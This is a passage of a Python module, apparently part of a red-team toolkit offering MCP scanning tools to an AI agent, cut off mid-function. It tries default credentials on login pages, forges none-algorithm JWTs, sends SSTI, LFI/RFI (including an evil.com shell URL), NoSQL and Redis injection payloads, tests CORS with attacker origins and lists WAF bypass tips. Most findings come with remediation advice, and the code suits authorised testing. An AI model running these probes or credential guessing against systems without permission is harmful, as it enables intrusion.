                            data=data,
                            timeout=5,
                            verify=get_verify_ssl(),
                            allow_redirects=True
                        )
                        response_text = r.text.lower()
                        for indicator in success_indicators:
                            if indicator in response_text:
                                findings.append({
                                    "type": "Weak Credential",
                                    "cms": cms,
                                    "endpoint": endpoint,
                                    "username": user,
                                    "password": pwd,
                                    "auth_type": "form",
                                    "severity": "CRITICAL"
                                })
                                break
                    except Exception:
                        pass

        return {
            "success": True,
            "url": url,
            "cms_targeted": cms,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "exposed_panels": exposed_panels,
            "tested_endpoints": endpoints,
            "tested_credentials": len(credentials),
            "recommendations": [
                f"修改 {cms} 默认凭证",
                "启用账户锁定机制",
                "实施多因素认证",
                "限制管理面板访问IP"
            ] if findings else []
        }

    @mcp.tool()
    def weak_password_detect(url: str, username: str = None, cms_hint: str = None) -> dict:
        """弱密码/默认凭证检测 - 检测常见弱密码和默认凭证 (A07)

        Args:
            url: 目标URL
            username: 指定用户名进行测试 (可选)
            cms_hint: CMS/框架提示 (如 "WordPress", "Tomcat")，来自tech_detect结果

        当提供 cms_hint 时，会使用针对该CMS的专用凭证字典和登录端点。
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        # 如果提供了 CMS 提示，使用专用配置
        if cms_hint:
            try:
                from core.pipeline import CMS_DEFAULT_CREDENTIALS
                if cms_hint in CMS_DEFAULT_CREDENTIALS:
                    cms_config = CMS_DEFAULT_CREDENTIALS[cms_hint]
                    return _cms_weak_password_detect(url, cms_hint, cms_config, username)
            except ImportError:
                pass  # 降级到通用检测

        # 通用默认凭证
        default_creds = [
            ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
            ("admin", "admin123"), ("root", "root"), ("root", "toor"),
            ("test", "test"), ("guest", "guest"), ("user", "user"),
            ("administrator", "administrator"), ("admin", ""),
            ("tomcat", "tomcat"), ("manager", "manager"),
        ]

        # 通用登录端点
        login_endpoints = [
            "/login", "/admin/login", "/user/login", "/api/login",
            "/auth/login", "/signin", "/admin", "/manager/html",
            "/wp-login.php", "/administrator",
        ]

        try:
            base_url = url.rstrip('/')

            login_found = []
            for endpoint in login_endpoints:
                try:
                    r = requests.get(f"{base_url}{endpoint}", timeout=5, verify=get_verify_ssl())
                    if r.status_code == 200 and any(x in r.text.lower() for x in ["password", "login", "密码", "登录"]):
                        login_found.append(endpoint)
                except Exception:
                    pass

            for endpoint in login_found[:3]:
                login_url = f"{base_url}{endpoint}"

                try:
                    r = requests.get(login_url, timeout=5, verify=get_verify_ssl())

                    user_fields = ["username", "user", "login", "email", "account"]
                    pass_fields = ["password", "pass", "pwd"]

                    for user, pwd in default_creds[:10]:
                        if username:
                            user = username

                        for uf in user_fields:
                            for pf in pass_fields:
                                try:
                                    data = {uf: user, pf: pwd}
                                    resp = requests.post(login_url, data=data, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                                    if resp.status_code in [302, 303] or \
                                       "logout" in resp.text.lower() or \
                                       "dashboard" in resp.text.lower() or \
                                       "welcome" in resp.text.lower():
                                        findings.append({
                                            "type": "Weak Credential",
                                            "endpoint": endpoint,
                                            "username": user,
                                            "password": pwd,
                                            "severity": "CRITICAL"
                                        })
                                        break
                                except Exception:
                                    pass
                            if findings:
                                break
                        if findings:
                            break
                except Exception:
                    pass

            admin_panels = {
                "/phpmyadmin/": [("root", ""), ("root", "root")],
                "/adminer.php": [("root", ""), ("root", "root")],
                "/manager/html": [("tomcat", "tomcat"), ("admin", "admin")],
            }

            for panel, creds in admin_panels.items():
                try:
                    r = requests.get(f"{base_url}{panel}", timeout=5, verify=get_verify_ssl())
                    if r.status_code == 200:
                        findings.append({
                            "type": "Admin Panel Found",
                            "endpoint": panel,
                            "default_creds": creds,
                            "severity": "MEDIUM",
                            "detail": "发现管理面板，建议测试默认凭证"
                        })
                except Exception:
                    pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "login_pages": login_found if 'login_found' in dir() else [],
            "vulnerable": len([f for f in findings if f["type"] == "Weak Credential"]) > 0,
            "findings": findings,
            "recommendations": [
                "强制使用强密码策略",
                "修改所有默认凭证",
                "启用账户锁定机制",
                "实施多因素认证",
                "添加登录失败延迟"
            ] if findings else []
        }

    @mcp.tool()
    def security_headers_check(url: str) -> dict:
        """HTTP安全头检测 - 检测缺失或配置错误的安全头 (A05)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        security_headers = {
            "Strict-Transport-Security": {
                "severity": "HIGH",
                "description": "HSTS - 强制HTTPS连接",
                "recommendation": "添加: Strict-Transport-Security: max-age=31536000; includeSubDomains"
            },
            "X-Content-Type-Options": {
                "severity": "MEDIUM",
                "description": "防止MIME类型嗅探",
                "recommendation": "添加: X-Content-Type-Options: nosniff"
            },
            "X-Frame-Options": {
                "severity": "MEDIUM",
                "description": "防止点击劫持",
                "recommendation": "添加: X-Frame-Options: DENY 或 SAMEORIGIN"
            },
            "X-XSS-Protection": {
                "severity": "LOW",
                "description": "XSS过滤器(已弃用但仍建议)",
                "recommendation": "添加: X-XSS-Protection: 1; mode=block"
            },
            "Content-Security-Policy": {
                "severity": "HIGH",
                "description": "CSP - 防止XSS和数据注入",
                "recommendation": "添加严格的CSP策略"
            },
            "Referrer-Policy": {
                "severity": "LOW",
                "description": "控制Referrer信息泄露",
                "recommendation": "添加: Referrer-Policy: strict-origin-when-cross-origin"
            },
            "Permissions-Policy": {
                "severity": "LOW",
                "description": "控制浏览器功能权限",
                "recommendation": "添加: Permissions-Policy: geolocation=(), microphone=()"
            },
        }

        dangerous_headers = {
            "Server": "泄露服务器信息",
            "X-Powered-By": "泄露技术栈信息",
            "X-AspNet-Version": "泄露ASP.NET版本",
            "X-AspNetMvc-Version": "泄露MVC版本",
        }

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            headers = {k.lower(): v for k, v in resp.headers.items()}

            missing = []
            present = []
            dangerous = []

            for header, info in security_headers.items():
                if header.lower() not in headers:
                    missing.append({
                        "header": header,
                        "severity": info["severity"],
                        "description": info["description"],
                        "recommendation": info["recommendation"]
                    })
                else:
                    present.append({
                        "header": header,
                        "value": headers[header.lower()],
                        "status": "OK"
                    })

            for header, desc in dangerous_headers.items():
                if header.lower() in headers:
                    dangerous.append({
                        "header": header,
                        "value": headers[header.lower()],
                        "description": desc,
                        "severity": "LOW",
                        "recommendation": f"移除或隐藏 {header} 头"
                    })

            cookie_issues = []
            set_cookie = resp.headers.get("Set-Cookie", "")
            if set_cookie:
                if "httponly" not in set_cookie.lower():
                    cookie_issues.append({
                        "issue": "Missing HttpOnly",
                        "severity": "MEDIUM",
                        "description": "Cookie缺少HttpOnly标志，可能被XSS窃取"
                    })
                if "secure" not in set_cookie.lower() and url.startswith("https"):
                    cookie_issues.append({
                        "issue": "Missing Secure",
                        "severity": "MEDIUM",
                        "description": "Cookie缺少Secure标志，可能通过HTTP泄露"
                    })
                if "samesite" not in set_cookie.lower():
                    cookie_issues.append({
                        "issue": "Missing SameSite",
                        "severity": "LOW",
                        "description": "Cookie缺少SameSite标志，可能受CSRF攻击"
                    })

            score = 100
            for m in missing:
                if m["severity"] == "HIGH":
                    score -= 15
                elif m["severity"] == "MEDIUM":
                    score -= 10
                else:
                    score -= 5
            for d in dangerous:
                score -= 5
            for c in cookie_issues:
                if c["severity"] == "MEDIUM":
                    score -= 10
                else:
                    score -= 5
            score = max(0, score)

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "security_score": score,
            "grade": "A" if score >= 90 else "B" if score >= 70 else "C" if score >= 50 else "D" if score >= 30 else "F",
            "missing_headers": missing,
            "present_headers": present,
            "dangerous_headers": dangerous,
            "cookie_issues": cookie_issues,
            "summary": f"缺失 {len(missing)} 个安全头，发现 {len(dangerous)} 个信息泄露头"
        }

    @mcp.tool()
    def jwt_vuln_detect(url: str, token: str = None) -> dict:
        """JWT漏洞检测 - 检测JWT认证相关漏洞 (A01/A07)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []
        jwt_info = None

        def decode_jwt(token):
            try:
                parts = token.split('.')
                if len(parts) != 3:
                    return None

                def b64_decode(data):
                    padding = 4 - len(data) % 4
                    if padding != 4:
                        data += '=' * padding
                    return base64.urlsafe_b64decode(data)

                header = json.loads(b64_decode(parts[0]))
                payload = json.loads(b64_decode(parts[1]))

                return {"header": header, "payload": payload, "signature": parts[2]}
            except Exception:
                return None

        try:
            if not token:
                resp = requests.get(url, timeout=10, verify=get_verify_ssl())

                auth_header = resp.headers.get("Authorization", "")
                if auth_header.startswith("Bearer "):
                    token = auth_header[7:]

                for name, value in resp.cookies.items():
                    if value.count('.') == 2 and len(value) > 50:
                        decoded = decode_jwt(value)
                        if decoded:
                            token = value
                            findings.append({
                                "type": "JWT in Cookie",
                                "cookie_name": name,
                                "severity": "INFO"
                            })
                            break

                if not token and "eyJ" in resp.text:
                    jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                    matches = re.findall(jwt_pattern, resp.text)
                    if matches:
                        token = matches[0]

            if token:
                jwt_info = decode_jwt(token)

                if jwt_info:
                    header = jwt_info["header"]
                    payload = jwt_info["payload"]

                    alg = header.get("alg", "").upper()
                    if alg == "NONE":
                        findings.append({
                            "type": "Algorithm None",
                            "severity": "CRITICAL",
                            "description": "JWT使用none算法，签名可被绕过"
                        })
                    elif alg in ["HS256", "HS384", "HS512"]:
                        findings.append({
                            "type": "Symmetric Algorithm",
                            "algorithm": alg,
                            "severity": "MEDIUM",
                            "description": "使用对称加密，可能存在密钥爆破风险"
                        })

                    sensitive_keys = ["password", "pwd", "secret", "key", "token", "credit", "ssn"]
                    for key in payload.keys():
                        if any(s in key.lower() for s in sensitive_keys):
                            findings.append({
                                "type": "Sensitive Data in Payload",
                                "key": key,
                                "severity": "HIGH",
                                "description": f"JWT payload包含敏感字段: {key}"
                            })

                    exp = payload.get("exp")
                    if not exp:
                        findings.append({
                            "type": "No Expiration",
                            "severity": "MEDIUM",
                            "description": "JWT没有设置过期时间"
                        })
                    elif exp < time.time():
                        findings.append({
                            "type": "Expired Token",
                            "severity": "INFO",
                            "description": "JWT已过期但仍在使用"
                        })

                    if "jku" in header:
                        findings.append({
                            "type": "JKU Header Present",
                            "value": header["jku"],
                            "severity": "HIGH",
                            "description": "存在jku头，可能存在密钥注入漏洞"
                        })
                    if "x5u" in header:
                        findings.append({
                            "type": "X5U Header Present",
                            "value": header["x5u"],
                            "severity": "HIGH",
                            "description": "存在x5u头，可能存在证书注入漏洞"
                        })

                    if "kid" in header:
                        findings.append({
                            "type": "KID Header Present",
                            "value": header["kid"],
                            "severity": "MEDIUM",
                            "description": "存在kid头，测试SQL注入/路径遍历"
                        })

                    try:
                        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
                        none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                        none_token = f"{none_header}.{none_payload}."

                        test_resp = requests.get(url, headers={"Authorization": f"Bearer {none_token}"}, timeout=5, verify=get_verify_ssl())
                        if test_resp.status_code != 401:
                            findings.append({
                                "type": "Algorithm Confusion",
                                "severity": "CRITICAL",
                                "description": "服务器接受none算法JWT，存在认证绕过"
                            })
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "jwt_found": token is not None,
            "jwt_info": jwt_info,
            "vulnerable": any(f["severity"] in ["CRITICAL", "HIGH"] for f in findings),
            "findings": findings,
            "recommendations": [
                "使用RS256等非对称算法",
                "设置合理的过期时间",
                "不在payload中存储敏感信息",
                "验证alg头，拒绝none算法",
                "使用强密钥(至少256位)"
            ] if findings else []
        }

    @mcp.tool()
    def ssti_detect(url: str, param: str = None) -> dict:
        """SSTI模板注入检测 - 检测服务端模板注入漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        payloads = {
            "jinja2": [
                ("{{7*7}}", "49"),
                ("{{config}}", "Config"),
                ("{{self.__class__}}", "class"),
            ],
            "twig": [
                ("{{7*7}}", "49"),
                ("{{_self.env}}", "Environment"),
            ],
            "freemarker": [
                ("${7*7}", "49"),
                ("${.version}", "version"),
            ],
            "velocity": [
                ("#set($x=7*7)$x", "49"),
            ],
            "smarty": [
                ("{$smarty.version}", "Smarty"),
                ("{7*7}", "49"),
            ],
            "mako": [
                ("${7*7}", "49"),
            ],
            "erb": [
                ("<%=7*7%>", "49"),
            ],
            "thymeleaf": [
                ("[[${7*7}]]", "49"),
            ],
        }

        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            params = []
            if param:
                params = [param]
            elif parsed.query:
                params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]

            if not params:
                params = ["q", "search", "query", "name", "input", "template", "page", "view"]

            for p in params[:5]:
                for engine, tests in payloads.items():
                    for payload, expected in tests:
                        try:
                            test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                            resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                            if expected in resp.text:
                                findings.append({
                                    "type": "SSTI",
                                    "engine": engine,
                                    "param": p,
                                    "payload": payload,
                                    "severity": "CRITICAL",
                                    "detail": f"检测到{engine}模板注入"
                                })
                                break
                        except Exception:
                            pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "ssti_vulns": findings,
            "recommendations": [
                "避免将用户输入直接传入模板引擎",
                "使用沙箱模式渲染模板",
                "对用户输入进行严格过滤"
            ] if findings else []
        }

    @mcp.tool()
    def lfi_detect(url: str, param: str = None) -> dict:
        """LFI/RFI文件包含检测 - 检测本地/远程文件包含漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        lfi_payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("..%2f..%2f..%2fetc/passwd", "root:"),
            ("..%252f..%252f..%252fetc/passwd", "root:"),
            ("/etc/passwd", "root:"),
            ("....\\....\\....\\windows\\win.ini", "[fonts]"),
            ("..\\..\\..\\windows\\win.ini", "[fonts]"),
            ("C:\\windows\\win.ini", "[fonts]"),
            ("php://filter/convert.base64-encode/resource=index.php", "PD9waHA"),
            ("php://filter/read=string.rot13/resource=index.php", "<?cuc"),
        ]

        rfi_payloads = [
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt",
            "//evil.com/shell.txt",
        ]

        try:
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

            params = []
            if param:
                params = [param]
            elif parsed.query:
                params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]

            if not params:
                params = ["file", "page", "include", "path", "doc", "document", "folder", "root", "pg", "style", "template", "php_path", "lang"]

            for p in params[:5]:
                for payload, indicator in lfi_payloads:
                    try:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                        resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                        if indicator in resp.text:
                            findings.append({
                                "type": "LFI",
                                "param": p,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "detail": "本地文件包含漏洞"
                            })
                            break
                    except Exception:
                        pass

                for payload in rfi_payloads:
                    try:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                        resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())

                        if "evil.com" in resp.text or "failed to open stream" in resp.text:
                            findings.append({
                                "type": "RFI_Potential",
                                "param": p,
                                "payload": payload,
                                "severity": "HIGH",
                                "detail": "可能存在远程文件包含漏洞"
                            })
                            break
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "lfi_vulns": findings,
            "recommendations": [
                "使用白名单限制可包含的文件",
                "禁用allow_url_include",
                "对文件路径进行严格过滤"
            ] if findings else []
        }

    @mcp.tool()
    def waf_detect(url: str) -> dict:
        """WAF检测 - 识别目标使用的Web应用防火墙"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        waf_signatures = {
            "Cloudflare": {
                "headers": ["cf-ray", "cf-cache-status", "__cfduid"],
                "body": ["cloudflare", "attention required"],
                "cookies": ["__cfduid", "cf_clearance"]
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid", "x-amz-cf-id"],
                "body": ["aws", "amazon"]
            },
            "Akamai": {
                "headers": ["akamai", "x-akamai"],
                "body": ["akamai", "reference #"]
            },
            "ModSecurity": {
                "headers": ["mod_security", "modsecurity"],
                "body": ["mod_security", "modsecurity", "not acceptable"]
            },
            "Imperva/Incapsula": {
                "headers": ["x-iinfo", "x-cdn"],
                "cookies": ["incap_ses", "visid_incap"]
            },
            "F5 BIG-IP": {
                "headers": ["x-wa-info"],
                "cookies": ["bigipserver", "ts"]
            },
            "Sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache"],
                "body": ["sucuri", "cloudproxy"]
            },
            "阿里云WAF": {
                "headers": ["ali-swift-global-savetime"],
                "body": ["aliyun", "errors.aliyun.com"]
            },
            "腾讯云WAF": {
                "headers": ["tencent"],
                "body": ["waf.tencent-cloud.com"]
            },
        }

        detected_wafs = []
        test_results = {}

        try:
            normal_resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            test_results["normal"] = {
                "status": normal_resp.status_code,
                "headers": dict(normal_resp.headers)
            }

            malicious_payloads = [
                "?id=1' OR '1'='1",
                "?id=<script>alert(1)</script>",
                "?id=../../../etc/passwd",
                "?id=;cat /etc/passwd",
            ]

            for payload in malicious_payloads:
                try:
                    mal_resp = requests.get(url + payload, timeout=10, verify=get_verify_ssl())
                    test_results[f"malicious_{payload[:20]}"] = mal_resp.status_code
                except Exception:
                    pass

            headers_lower = {k.lower(): v.lower() for k, v in normal_resp.headers.items()}
            body_lower = normal_resp.text.lower()
            cookies = normal_resp.cookies.get_dict()

            for waf_name, signatures in waf_signatures.items():
                confidence = 0

                for h in signatures.get("headers", []):
                    if h.lower() in headers_lower:
                        confidence += 40

                for b in signatures.get("body", []):
                    if b.lower() in body_lower:
                        confidence += 30

                for c in signatures.get("cookies", []):
                    if c.lower() in [k.lower() for k in cookies.keys()]:
                        confidence += 30

                if confidence >= 30:
                    detected_wafs.append({
                        "waf": waf_name,
                        "confidence": min(confidence, 100),
                        "evidence": "Header/Body/Cookie匹配"
                    })

            if normal_resp.status_code == 200:
                for payload in malicious_payloads:
                    try:
                        mal_resp = requests.get(url + payload, timeout=10, verify=get_verify_ssl())
                        if mal_resp.status_code in [403, 406, 429, 503]:
                            if not detected_wafs:
                                detected_wafs.append({
                                    "waf": "Unknown WAF",
                                    "confidence": 60,
                                    "evidence": f"恶意请求被拦截 (HTTP {mal_resp.status_code})"
                                })
                            break
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        bypass_tips = []
        if detected_wafs:
            bypass_tips = [
                "尝试大小写混淆: SeLeCt, UnIoN",
                "使用编码绕过: URL编码, Unicode编码",
                "使用注释混淆: /**/SELECT/**/",
                "使用等价函数替换",
                "分块传输编码绕过",
                "HTTP参数污染",
            ]

        return {
            "success": True,
            "url": url,
            "waf_detected": len(detected_wafs) > 0,
            "detected_wafs": detected_wafs,
            "bypass_tips": bypass_tips,
            "test_results": test_results
        }

    @mcp.tool()
    def cors_deep_check(url: str) -> dict:
        """CORS深度检测 - 检测跨域资源共享配置漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "https://target.com.evil.com",
            url.replace("https://", "https://evil.").replace("http://", "http://evil."),
        ]

        try:
            requests.get(url, timeout=10, verify=get_verify_ssl())

            for origin in test_origins:
                try:
                    headers = {"Origin": origin}
                    resp = requests.get(url, headers=headers, timeout=10, verify=get_verify_ssl())

                    acao = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                    if acao == "*":
                        findings.append({
                            "type": "Wildcard Origin",
                            "origin": origin,
                            "acao": acao,
                            "severity": "MEDIUM",
                            "detail": "允许任意来源访问"
                        })
                    elif acao == origin:
                        severity = "HIGH" if acac.lower() == "true" else "MEDIUM"
                        findings.append({
                            "type": "Origin Reflection",
                            "origin": origin,
                            "acao": acao,
                            "acac": acac,
                            "severity": severity,
                            "detail": "反射任意Origin" + ("且允许携带凭证" if acac.lower() == "true" else "")
                        })
                    elif origin == "null" and acao == "null":
                        findings.append({
                            "type": "Null Origin Allowed",
                            "severity": "HIGH",
                            "detail": "允许null来源，可通过iframe沙箱利用"
                        })

                except Exception:
                    pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "cors_vulns": findings,
            "recommendations": [
                "使用白名单验证Origin",
                "避免反射任意Origin",
                "谨慎使用Access-Control-Allow-Credentials",
                "不要允许null来源"
            ] if findings else []
        }

    @mcp.tool()
    def nosql_detect(url: str, param: str = None, db_type: str = "auto") -> dict:
        """NoSQL注入检测 - 支持MongoDB/Redis/Elasticsearch等
        
        Args:
            url: 目标URL
            param: 可选，指定检测的参数名
            db_type: 数据库类型 (auto/mongodb/redis/elasticsearch)
        
        Returns:
            检测结果，包含发现的NoSQL注入漏洞
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}
        
        vulns = []
        
        # MongoDB 注入 Payload
        mongodb_payloads = [
            # 基础操作符注入
            {"$gt": ""},
            {"$ne": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
            {"$or": [{"a": 1}, {"b": 2}]},
            # 认证绕过
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": "^"}',
            # 布尔盲注
            '{"$where": "this.password.length > 0"}',
            '{"$where": "sleep(3000)"}',
        ]
        
        # MongoDB 字符串 Payload
        mongodb_str_payloads = [
            "' || '1'=='1",
            '{"$gt": ""}',
            '[$ne]=1',
            '[$gt]=',
            '[$regex]=.*',
            'true, $where: "1 == 1"',
            '"; return true; var dummy="',
        ]
        
        # Redis 注入 Payload
        redis_payloads = [
            "\r\nPING\r\n",
            "\r\nINFO\r\n",
            "\r\nCONFIG GET *\r\n",
            "*1\r\n$4\r\nPING\r\n",
        ]
        
        # Elasticsearch 注入 Payload
        elasticsearch_payloads = [
            '{"query": {"match_all": {}}}',
            '{"size": 10000}',
            '{"script_fields": {"test": {"script": "1+1"}}}',
        ]
        
        # MongoDB 错误特征
        mongodb_errors = [
            "MongoError", "mongo", "MongoDB", "BSON", 
            "ObjectId", "cannot be cast to", "query selector",
            "invalid operator", "$where", "mapreduce",
            "aggregate"
        ]
        
        # Redis 响应特征
        redis_indicators = [
            "PONG", "redis_version", "+OK", "-ERR",
            "connected_clients", "used_memory"
        ]
        
        # Elasticsearch 响应特征
        es_indicators = [
            '"hits":', '"_shards":', '"took":', '"timed_out":',
            "elasticsearch", '"_index":', '"_source":'
        ]
        
        base_url = url
        test_params = [param] if param else ["id", "user", "username", "search", "q", "query", "filter", "data", "json"]
        
        for p in test_params:
            # 测试 MongoDB 注入
            if db_type in ["auto", "mongodb"]:
                for payload in mongodb_str_payloads:
                    try:
                        if "?" in base_url:
                            test_url = f"{base_url}&{p}={requests.utils.quote(str(payload))}"
                        else:
                            test_url = f"{base_url}?{p}={requests.utils.quote(str(payload))}"
                        
                        resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                        resp_lower = resp.text.lower()
                        
                        # 检查错误特征
                        for error in mongodb_errors:
                            if error.lower() in resp_lower:
                                vulns.append({
                                    "type": "MongoDB Injection",
                                    "severity": "HIGH",
                                    "param": p,
                                    "payload": str(payload),
                                    "evidence": error,
                                    "url": test_url
                                })
                                break
                                
                    except Exception:
                        pass
                
                # 测试 JSON Body 注入
                try:
                    headers = {"Content-Type": "application/json"}
                    for payload in mongodb_payloads:
                        if isinstance(payload, dict):
                            data = json.dumps({p: payload})
                        else:
                            data = json.dumps({p: payload})
                        
                        resp = requests.post(base_url, data=data, headers=headers, 
                                            timeout=10, verify=get_verify_ssl())
                        resp_lower = resp.text.lower()
                        
                        for error in mongodb_errors:
                            if error.lower() in resp_lower:
                                vulns.append({
                                    "type": "MongoDB JSON Injection",
                                    "severity": "CRITICAL",
                                    "param": p,
                                    "payload": str(payload),
                                    "evidence": error,
                                    "method": "POST"
                                })
                                break
                except Exception:
                    pass
            
            # 测试 Redis 注入
            if db_type in ["auto", "redis"]:
                for payload in redis_payloads:
                    try:
                        if "?" in base_url:
                            test_url = f"{base_url}&{p}={requests.utils.quote(payload)}"
                        else:
                            test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                        
                        resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())
                        
                        for indicator in redis_indicators:
                            if indicator in resp.text:
                                vulns.append({
                                    "type": "Redis Injection",
                                    "severity": "CRITICAL",
                                    "param": p,
                                    "payload": payload.replace("\r\n", "\\r\\n"),
                                    "evidence": indicator,
                                    "url": test_url
                                })
                                break
                    except Exception:
                        pass
            
            # 测试 Elasticsearch 注入
            if db_type in ["auto", "elasticsearch"]:
                for payload in elasticsearch_payloads:
                    try:
                        headers = {"Content-Type": "application/json"}
                        resp = requests.post(base_url, data=payload, headers=headers,
                                            timeout=10, verify=get_verify_ssl())
                        
                        for indicator in es_indicators:
                            if indicator in resp.text:
                                vulns.append({
                                    "type": "Elasticsearch Injection",
                                    "severity": "HIGH",
                                    "param": "body",
                                    "payload": payload[:50] + "...",
                                    "evidence": indicator,
                                    "method": "POST"
                                })
                                break
                    except Exception:
                        pass
        
        return {
            "success": True,
            "url": url,
            "db_type": db_type,
            "nosql_vulns": vulns,
            "total": len(vulns),
            "recommendations": [
                "使用参数化查询或ORM",
                "对用户输入进行严格验证",
                "避免直接拼接用户输入到查询语句",
                "实施最小权限原则",
                "使用Web应用防火墙(WAF)"
            ] if vulns else []
        }

    @mcp.tool()
    def access_control_test(
        url: str,
        user1_token: str = None,
        user2_token: str = None,
        user1_cookie: str = None,
        user2_cookie: str = None,
        test_type: str = "all",
        resource_ids: list = None
    ) -> dict:
        """访问控制差分测试 - 检测水平越权和垂直越权漏洞
        
        通过比较两个不同权限用户对同一资源的访问结果，检测越权漏洞。
        
        Args:
            url: 目标URL（可包含 {id} 占位符用于资源ID替换）
            user1_token: 用户1的认证Token（Bearer格式）
            user2_token: 用户2的认证Token
            user1_cookie: 用户1的Cookie（与Token二选一）
            user2_cookie: 用户2的Cookie
            test_type: 测试类型 (horizontal/vertical/all)
            resource_ids: 要测试的资源ID列表（用于替换URL中的{id}）
        
        Returns:
            检测结果，包含发现的越权漏洞
        
        示例:
            # 水平越权测试（同级用户访问对方资源）
            access_control_test(
                url="https://api.example.com/users/{id}/profile",
                user1_token="token_of_user_1",
                user2_token="token_of_user_2",
                resource_ids=["1", "2"],
                test_type="horizontal"
            )
            
            # 垂直越权测试（低权限用户访问高权限接口）
            access_control_test(
                url="https://api.example.com/admin/users",
                user1_token="admin_token",
                user2_token="normal_user_token",
                test_type="vertical"
            )
        """
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}
        
        if not ((user1_token and user2_token) or (user1_cookie and user2_cookie)):
            return {
                "success": False, 
                "error": "需要提供两套认证凭证（Token或Cookie）进行对比测试",
                "usage": "请提供 user1_token/user2_token 或 user1_cookie/user2_cookie"
            }
        
        findings = []
        tested_endpoints = []
        
        # 构建请求头
        def build_headers(token=None, cookie=None):
            headers = {"User-Agent": "AutoRedTeam-AccessControl/1.0"}
            if token:
                headers["Authorization"] = f"Bearer {token}" if not token.startswith("Bearer") else token
            if cookie:
                headers["Cookie"] = cookie
            return headers
        
        headers1 = build_headers(user1_token, user1_cookie)
        headers2 = build_headers(user2_token, user2_cookie)
        
        # 测试URL列表
        test_urls = []
        if resource_ids and "{id}" in url:
            for rid in resource_ids:
                test_urls.append(url.replace("{id}", str(rid)))
        else:
            test_urls = [url]
        
        # 敏感资源路径模式（用于垂直越权检测）
        admin_patterns = [
            "/admin", "/manage", "/dashboard", "/console",
            "/settings", "/config", "/users", "/roles",
            "/permissions", "/system", "/logs", "/audit"
        ]
        
        for test_url in test_urls:
            tested_endpoints.append(test_url)
            
            try:
                # 用户1请求（通常是资源所有者或高权限用户）
                resp1 = requests.get(test_url, headers=headers1, timeout=15, 
                                    verify=get_verify_ssl(), allow_redirects=False)
                
                # 用户2请求（通常是非所有者或低权限用户）
                resp2 = requests.get(test_url, headers=headers2, timeout=15,
                                    verify=get_verify_ssl(), allow_redirects=False)
                
                # 水平越权检测
                if test_type in ["all", "horizontal"]:
                    # 如果用户1能访问，用户2也能访问相同资源内容，可能存在水平越权
                    if resp1.status_code == 200 and resp2.status_code == 200:
                        # 比较响应内容相似度
                        content_match = resp1.text == resp2.text
                        # 检查是否包含敏感数据
                        sensitive_patterns = ["email", "phone", "address", "password", 
                                             "token", "secret", "private", "ssn", "credit"]
                        has_sensitive = any(p in resp2.text.lower() for p in sensitive_patterns)
                        
                        if content_match and has_sensitive:
                            findings.append({
                                "type": "Horizontal Privilege Escalation",
                                "severity": "HIGH",
                                "url": test_url,
                                "description": "用户2可以访问用户1的资源，响应内容相同且包含敏感数据",
                                "evidence": {
                                    "user1_status": resp1.status_code,
                                    "user2_status": resp2.status_code,
                                    "content_identical": content_match,
